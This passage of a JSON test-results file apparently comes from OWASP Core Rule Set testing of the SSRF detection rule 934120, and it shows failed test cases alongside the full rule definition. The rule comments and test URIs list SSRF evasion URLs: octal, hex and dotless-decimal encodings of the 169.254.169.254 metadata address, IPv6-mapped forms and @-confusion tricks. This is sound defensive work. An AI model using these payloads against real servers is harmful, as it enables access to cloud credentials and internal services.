          "text" : " http://0251.0376.0251.0376/ Dotted octal - Covered by the same below"
        }, {
          "type" : "Comment",
          "text" : " http://0251.00376.000251.0000376/ Dotted octal with padding - (?:0{1,4}\\d{3}\\.){3}0{1,4}\\d{3})"
        }, {
          "type" : "Comment",
          "text" : " http://169.254.43518/ - (?:\\d{1,3}\\.){2}\\.\\d{5}"
        }, {
          "type" : "Comment",
          "text" : " http://169.16689662/ - \\d{1,3}\\.\\d{8}"
        }, {
          "type" : "Comment",
          "text" : " http://[::ffff:a9fe:a9fe] IPV6 Compressed - IPv6 regex from https://ihateregex.io/expr/ipv6/, with [0-9] converted to \\d and with non-capturing groups (below)"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded -  (?:(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,7}:|(?:[0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|(?:[0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|(?:[0-9a-fA-F]{1,4}:){1,3}(?::[0-9a-fA-F]{1,4}){1,4}|(?:[0-9a-fA-F]{1,4}:){1,2}(?::[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:(?:(?::[0-9a-fA-F]{1,4}){1,6})|:(?:(?::[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(?::[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(?::0{1,4}){0,1}:){0,1}(?:(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)|(?:[0-9a-fA-F]{1,4}:){1,4}:(?:(?:25[0-5]|(2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4 - ((?:[0-9a-fA-F]{1,4}:){6}(?:(25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[::]"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/+&@google.com:80#+@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/?@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/#@www.google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80\\\\@127.88.23.245:22/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@127.88.23.245:22/#+@google.com:80/"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@google.com:80#+@127.88.23.245:22/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934120.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934120"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://(?:[0-9]{10}|(?:0x[0-9a-f]{2}\\.){3}0x[0-9a-f]{2}|0x(?:[0-9a-f]{8}|[0-9a-f]{16})|(?:0{1,4}[0-9]{1,3}\\.){3}0{1,4}[0-9]{1,3}|[0-9]{1,3}\\.(?:[0-9]{1,3}\\.[0-9]{5}|[0-9]{8})|(?:\\x5c\\x5c[\\-0-9a-z]\\.?_?)+|\\[[0-:a-f]+(?:[\\.0-9]+|%[0-9A-Z_a-z]+)?\\]|[a-z][\\-\\.0-9A-Z_a-z]{1,255}:[0-9]{1,5}(?:#?[\\s\\x0b]*&?@(?:(?:[0-9]{1,3}\\.){3}[0-9]{1,3}|[a-z][\\-\\.0-9A-Z_a-z]{1,255}):[0-9]{1,5}/?)+|[\\.0-9]{0,11}(?:\\x{e2}(?:\\x91[\\xa0-\\x{bf}]|\\x92[\\x80-\\x{bf}]|\\x93[\\x80-\\x{a9}\\x{ab}-\\x{bf}])|\\x{e3}\\x80\\x82)+)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Server Side Request Forgery (SSRF) Attack: URL Parameter using IP Address"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-ssrf"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/225/664"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934120",
    "test_id" : 39,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934120.yaml",
    "description" : "SSRF - Enclosed alphanumerics, dots",
    "cause" : "failed expect_id check: 934120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=934110 - Possible Server Side Request Forgery (SSRF) Attack: Cloud provider metadata URL in Parameter" ]
    },
    "test" : {
      "test_id" : 39,
      "desc" : "SSRF - Enclosed alphanumerics, dots",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?ssrf=http://169254169254/",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ SSRF Attacks ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " PL2 rules adds SSRF capture for common evasion techniques."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " We add captures for these evasion techniques: (see source in util/regexp-assemble/data/regexp-934120.data)"
        }, {
          "type" : "Comment",
          "text" : " http://425.510.425.510/ Dotted decimal with overflow (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://2852039166/ Dotless decimal - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://7147006462/ Dotless decimal with overflow - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal - (?:0x[a-f0-9]{2}\\.){3}0x[a-f0-9]{2}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9FEA9FE/ Dotless hexadecimal - 0x[a-f0-9]{8}"
        }, {
          "type" : "Comment",
          "text" : " http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow - 0x[a-f0-9]{16}"
        }, {
          "type" : "Comment",
          "text" : " http://0251.0376.0251.0376/ Dotted octal - Covered by the same below"
        }, {
          "type" : "Comment",
          "text" : " http://0251.00376.000251.0000376/ Dotted octal with padding - (?:0{1,4}\\d{3}\\.){3}0{1,4}\\d{3})"
        }, {
          "type" : "Comment",
          "text" : " http://169.254.43518/ - (?:\\d{1,3}\\.){2}\\.\\d{5}"
        }, {
          "type" : "Comment",
          "text" : " http://169.16689662/ - \\d{1,3}\\.\\d{8}"
        }, {
          "type" : "Comment",
          "text" : " http://[::ffff:a9fe:a9fe] IPV6 Compressed - IPv6 regex from https://ihateregex.io/expr/ipv6/, with [0-9] converted to \\d and with non-capturing groups (below)"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded -  (?:(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,7}:|(?:[0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|(?:[0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|(?:[0-9a-fA-F]{1,4}:){1,3}(?::[0-9a-fA-F]{1,4}){1,4}|(?:[0-9a-fA-F]{1,4}:){1,2}(?::[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:(?:(?::[0-9a-fA-F]{1,4}){1,6})|:(?:(?::[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(?::[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(?::0{1,4}){0,1}:){0,1}(?:(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)|(?:[0-9a-fA-F]{1,4}:){1,4}:(?:(?:25[0-5]|(2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4 - ((?:[0-9a-fA-F]{1,4}:){6}(?:(25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[::]"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/+&@google.com:80#+@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/?@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/#@www.google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80\\\\@127.88.23.245:22/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@127.88.23.245:22/#+@google.com:80/"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@google.com:80#+@127.88.23.245:22/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934120.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934120"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://(?:[0-9]{10}|(?:0x[0-9a-f]{2}\\.){3}0x[0-9a-f]{2}|0x(?:[0-9a-f]{8}|[0-9a-f]{16})|(?:0{1,4}[0-9]{1,3}\\.){3}0{1,4}[0-9]{1,3}|[0-9]{1,3}\\.(?:[0-9]{1,3}\\.[0-9]{5}|[0-9]{8})|(?:\\x5c\\x5c[\\-0-9a-z]\\.?_?)+|\\[[0-:a-f]+(?:[\\.0-9]+|%[0-9A-Z_a-z]+)?\\]|[a-z][\\-\\.0-9A-Z_a-z]{1,255}:[0-9]{1,5}(?:#?[\\s\\x0b]*&?@(?:(?:[0-9]{1,3}\\.){3}[0-9]{1,3}|[a-z][\\-\\.0-9A-Z_a-z]{1,255}):[0-9]{1,5}/?)+|[\\.0-9]{0,11}(?:\\x{e2}(?:\\x91[\\xa0-\\x{bf}]|\\x92[\\x80-\\x{bf}]|\\x93[\\x80-\\x{a9}\\x{ab}-\\x{bf}])|\\x{e3}\\x80\\x82)+)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Server Side Request Forgery (SSRF) Attack: URL Parameter using IP Address"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-ssrf"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/225/664"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934120",
    "test_id" : 41,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934120.yaml",
    "description" : "SSRF - Glibc NSS features",
    "cause" : "failed expect_id check: 934120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 41,
      "desc" : "SSRF - Glibc NSS features",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?ssrf=http://\\\\l\\\\o\\\\c\\\\a\\\\l\\\\h\\\\o\\\\s\\\\t/",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ SSRF Attacks ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " PL2 rules adds SSRF capture for common evasion techniques."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " We add captures for these evasion techniques: (see source in util/regexp-assemble/data/regexp-934120.data)"
        }, {
          "type" : "Comment",
          "text" : " http://425.510.425.510/ Dotted decimal with overflow (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://2852039166/ Dotless decimal - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://7147006462/ Dotless decimal with overflow - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal - (?:0x[a-f0-9]{2}\\.){3}0x[a-f0-9]{2}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9FEA9FE/ Dotless hexadecimal - 0x[a-f0-9]{8}"
        }, {
          "type" : "Comment",
          "text" : " http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow - 0x[a-f0-9]{16}"
        }, {
          "type" : "Comment",
          "text" : " http://0251.0376.0251.0376/ Dotted octal - Covered by the same below"
        }, {
          "type" : "Comment",
          "text" : " http://0251.00376.000251.0000376/ Dotted octal with padding - (?:0{1,4}\\d{3}\\.){3}0{1,4}\\d{3})"
        }, {
          "type" : "Comment",
          "text" : " http://169.254.43518/ - (?:\\d{1,3}\\.){2}\\.\\d{5}"
        }, {
          "type" : "Comment",
          "text" : " http://169.16689662/ - \\d{1,3}\\.\\d{8}"
        }, {
          "type" : "Comment",
          "text" : " http://[::ffff:a9fe:a9fe] IPV6 Compressed - IPv6 regex from https://ihateregex.io/expr/ipv6/, with [0-9] converted to \\d and with non-capturing groups (below)"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded -  (?:(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,7}:|(?:[0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|(?:[0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|(?:[0-9a-fA-F]{1,4}:){1,3}(?::[0-9a-fA-F]{1,4}){1,4}|(?:[0-9a-fA-F]{1,4}:){1,2}(?::[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:(?:(?::[0-9a-fA-F]{1,4}){1,6})|:(?:(?::[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(?::[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(?::0{1,4}){0,1}:){0,1}(?:(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)|(?:[0-9a-fA-F]{1,4}:){1,4}:(?:(?:25[0-5]|(2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4 - ((?:[0-9a-fA-F]{1,4}:){6}(?:(25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[::]"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/+&@google.com:80#+@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/?@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/#@www.google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80\\\\@127.88.23.245:22/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@127.88.23.245:22/#+@google.com:80/"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@google.com:80#+@127.88.23.245:22/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934120.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934120"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://(?:[0-9]{10}|(?:0x[0-9a-f]{2}\\.){3}0x[0-9a-f]{2}|0x(?:[0-9a-f]{8}|[0-9a-f]{16})|(?:0{1,4}[0-9]{1,3}\\.){3}0{1,4}[0-9]{1,3}|[0-9]{1,3}\\.(?:[0-9]{1,3}\\.[0-9]{5}|[0-9]{8})|(?:\\x5c\\x5c[\\-0-9a-z]\\.?_?)+|\\[[0-:a-f]+(?:[\\.0-9]+|%[0-9A-Z_a-z]+)?\\]|[a-z][\\-\\.0-9A-Z_a-z]{1,255}:[0-9]{1,5}(?:#?[\\s\\x0b]*&?@(?:(?:[0-9]{1,3}\\.){3}[0-9]{1,3}|[a-z][\\-\\.0-9A-Z_a-z]{1,255}):[0-9]{1,5}/?)+|[\\.0-9]{0,11}(?:\\x{e2}(?:\\x91[\\xa0-\\x{bf}]|\\x92[\\x80-\\x{bf}]|\\x93[\\x80-\\x{a9}\\x{ab}-\\x{bf}])|\\x{e3}\\x80\\x82)+)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Server Side Request Forgery (SSRF) Attack: URL Parameter using IP Address"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-ssrf"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/225/664"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
